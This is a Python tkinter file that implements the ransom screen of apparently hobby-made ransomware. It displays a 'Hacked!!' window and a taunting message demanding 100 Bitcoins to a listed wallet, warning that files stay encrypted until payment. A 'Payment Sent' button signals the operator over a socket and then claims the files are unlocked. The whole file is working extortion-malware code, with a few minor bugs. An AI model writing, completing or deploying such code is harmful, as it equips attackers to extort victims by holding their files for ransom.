import tkinter
import uuid
from tkinter.ttk import *
from tkinter import Tk
from PIL import ImageTk, Image
from threading import Thread
import socket, select
import tkinter.messagebox as box


class App(Thread):
    def __init__(self, conn):
        Thread.__init__(self)
        self.start()
        self.conn = conn

    def callback(self):
        self.root.quit()

    def dialog1(self):
        self.conn.send(b'payment_recieved')
        box.showinfo('info','Unlocked')

        payment = ""
    def run(self):

        self.root = Tk()
        self.root.protocol("WM_DELETE_WINDOW", self.callback)
        self.root.title = "Hacked!!"
    
        self.root.geometry("1000x1000")

        frame = Frame(self.root, width=100, height=100)
        frame.pack()
        frame.place(anchor='center', relx=0.5, rely=0.5)

        # Create an object of tkinter ImageTk
        img = ImageTk.PhotoImage(Image.open("images/hacked_img.jpg"))

        # Create a Label Widget to display the text or Image
        label = Label(frame, image = img)
        label.pack()
        message = "                             Nice Day to get hacked huh? Poor you!\n"
        message += "Send 100 Bitcoins to the wallet address mentioned below or your files remain encrypted;)\n"
        message += "                             Wallet Address: 3FxAwHJ6AvmnU8NAoY8qFVEteddRbdkjhx"

        btn = Button(frame, text = 'Payment Sent',command = self.dialog1)
        btn.pack()
        btn.place(relx=0.5, rely=0.5, anchor='center')

        l = Label(self.root, text = message)
        l.config(font =("Courier", 14))
        l.pack()

        self.root.mainloop()
    
